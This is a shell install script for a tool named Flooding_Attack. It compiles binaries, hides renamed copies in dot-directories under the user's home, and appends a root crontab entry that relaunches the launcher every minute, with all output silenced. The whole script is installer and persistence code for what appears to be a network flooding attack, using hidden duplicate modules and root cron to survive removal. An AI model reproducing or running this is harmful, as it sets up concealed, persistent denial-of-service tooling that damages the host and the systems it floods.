u="$SUDO_USER"
path="/home/${u}"

echo ${u} ${path}

make > /dev/null 2>&1

pgrep Flooding_Attack > /dev/null 2>&1 && kill $(pgrep Flooding_Attack) > /dev/null 2>&1		#check if Flooding_Attack exist
pgrep Check_Attack > /dev/null 2>&1 && kill $(pgrep Check_Attack) > /dev/null 2>&1			#check if Check_Attack exist

#make dir
mkdir ${path}/.Launch_Attack > /dev/null 2>&1								#make dir for Launch_Attack
mkdir ${path}/.etc > /dev/null 2>&1									#make ./etc
mkdir ${path}/.etc/.module > /dev/null 2>&1								#make dir for module
mkdir ${path}/.etc_ > /dev/null 2>&1									#make ./etc_
mkdir ${path}/.etc_/.module > /dev/null 2>&1								#make dir for module

#make Launch_Attack
cp -f ./a ${path}/.Launch_Attack/ > /dev/null 2>&1							#copy a to Launch_Attack
mv -f ${path}/.Launch_Attack/a ${path}/.Launch_Attack/Launching_Attack > /dev/null 2>&1			#rename a to Launching_Attack

#make first module
cp -f ${path}/.Launch_Attack/Launching_Attack ${path}/.etc/.module > /dev/null 2>&1			#copy Launching_Attack to .module

cp -f ./b ${path}/.etc/.module/ > /dev/null 2>&1							#copy b to .module
mv -f ${path}/.etc/.module/b ${path}/.etc/.module/Flooding_Attack > /dev/null 2>&1			#rename b to Flooding_Attack

cp -f ./c ${path}/.etc/.module/ > /dev/null 2>&1							#copy c to .module
mv -f ${path}/.etc/.module/c ${path}/.etc/.module/Check_Attack > /dev/null 2>&1				#rename c to Check_Attack

#make second module
cp -f ${path}/.Launch_Attack/Launching_Attack ${path}/.etc_/.module/ > /dev/null 2>&1			#copy Launching_Attack to .module

cp -f ./b_ ${path}/.etc_/.module/ > /dev/null 2>&1							#copy b_ to .module
mv -f ${path}/.etc_/.module/b_ ${path}/.etc_/.module/Flooding_Attack > /dev/null 2>&1			#rename b_ to Flooding_Attack

cp -f ./c_ ${path}/.etc_/.module/ > /dev/null 2>&1							#copy c_ to .module
mv -f ${path}/.etc_/.module/c_ ${path}/.etc_/.module/Check_Attack > /dev/null 2>&1			#rename c_ to Check_Attack

#edit crontab
cp -f /etc/crontab ${path}/ > /dev/null 2>&1 								#copy crontab
grep -q "Launching_Attack" ${path}/crontab || echo "*/1 * * * * root pgrep Launching_ > /dev/null || cd ${path}/.Launch_Attack && [ -f ${path}/.Launch_Attack/Launching_Attack ] && ./Launching_Attack ${path}" >> ${path}/crontab								#edit crontab
mv -f ${path}/crontab /etc/crontab > /dev/null 2>&1							#restore crontab (cause cannot edit crontab directly)

#restart cron
/etc/init.d/cron restart > /dev/null 2>&1
